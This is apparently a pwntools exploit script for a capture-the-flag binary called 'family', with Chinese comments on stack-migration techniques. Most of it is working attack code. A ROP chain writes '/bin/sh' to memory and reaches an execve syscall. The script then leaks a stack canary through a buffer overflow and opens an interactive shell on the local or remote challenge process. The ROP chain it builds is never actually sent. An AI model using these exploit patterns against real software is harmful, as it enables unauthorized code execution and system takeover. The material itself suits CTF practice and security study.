from pwn import * 
from struct import pack

p = b'A' * 0x20 + b'B' * 50

p += pack('<Q', 0x0000000000410713) # pop rsi ; ret
p += pack('<Q', 0x00000000006ba0e0) # @ .data
p += pack('<Q', 0x000000000044a30c) # pop rax ; ret
p += b'/bin/sh'
p += pack('<Q', 0x00000000004801d1) # mov qword ptr [rsi], rax ; ret
p += pack('<Q', 0x0000000000410713) # pop rsi ; ret
p += pack('<Q', 0x00000000006ba0e8) # @ .data + 8
p += pack('<Q', 0x00000000004452b0) # xor rax, rax ; ret
p += pack('<Q', 0x00000000004801d1) # mov qword ptr [rsi], rax ; ret
p += pack('<Q', 0x0000000000400696) # pop rdi ; ret
p += pack('<Q', 0x00000000006ba0e0) # @ .data
p += pack('<Q', 0x0000000000410713) # pop rsi ; ret
p += pack('<Q', 0x00000000006ba0e8) # @ .data + 8
p += pack('<Q', 0x000000000044a365) # pop rdx ; ret
p += pack('<Q', 0x00000000006ba0e8) # @ .data + 8
p += pack('<Q', 0x00000000004452b0) # xor rax, rax ; ret
p += pack('<Q', 0x0000000000475660) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000475660) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000475660) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000475660) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000475660) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000475660) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000475660) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000475660) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000475660) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000475660) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000475660) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000475660) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000475660) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000475660) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000475660) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000475660) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000475660) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000475660) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000475660) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000475660) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000475660) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000475660) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000475660) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000475660) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000475660) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000475660) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000475660) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000475660) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000475660) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000475660) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000475660) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000475660) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000475660) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000475660) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000475660) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000475660) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000475660) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000475660) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000475660) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000475660) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000475660) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000475660) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000475660) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000475660) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000475660) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000475660) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000475660) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000475660) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000475660) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000475660) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000475660) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000475660) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000475660) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000475660) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000475660) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000475660) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000475660) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000475660) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000475660) # add rax, 1 ; ret
p += pack('<Q', 0x000000000040132c) # syscall

# Simple Migration
# 1. leave：把 rbp 設定成 buf
# 2. 執行 input_func 並將輸入讀取到 buf
#    輸入新的 rbp 以及 ROP chain
# 3. leave：stack 跳轉到 buf 並將 rbp 設成 buf2
# 4. 執行 ROP chain
# 5. 是否執行下一次 migration
#    是：跳回 2 (buf 和 buf2 對調，多次 migration 就在 buf 和 buf2 互換即可)
#    否：結束

# Fixed Size Migration
# payload (4*8 bytes) + rbp + ret
# ->
# payload (4*8 bytes) + buf1 + libc_read
# 1. leave：把 rbp 設定成 buf1
# 2. 回到 libc_read 讀取輸入，讀取到 buf1 - 0x20
# 3. leave：把 rsp 設定成 buf1 ，rbp 設定成 buf1 上寫的新 rbp

# First
# payload (4*8 bytes) + buf2 + libc_read
#       ｜              |
#   rbp - 0x20         rbp

# Second
# data (4*8 bytes) + buf1 + libc_read
#    ｜              |
# buf2 - 0x20     rbp(buf2) 

# +-------------+------+-------------+-------------+--------------+
# | buf2 - 0x20 | buf2 | buf2 + 0x20 | buf2 + 0x40 |     ...      |
# +-------------+------+-------------+-------------+--------------+
#        |         |          |             |
#       1st       2nd        3rd           4th  

#while True :
r = process('./family')
#r = remote('ctf.adl.tw', 11006)
print(r.recvuntil(b'Where is my daddy QQ'))
r.send(b"A"*0x1a)
print(r.recvuntil(b'A'*0x1a))
line = r.recvline()
print(line)
canary = u64(line[:8]) - 0x41
print(canary, hex(canary))
print(r.recvuntil(b'@Could u help me find my children?\n'))
payload = b"A" * 0x60 + p64(canary)
r.send(payload)
print(r.recv())
r.interactive()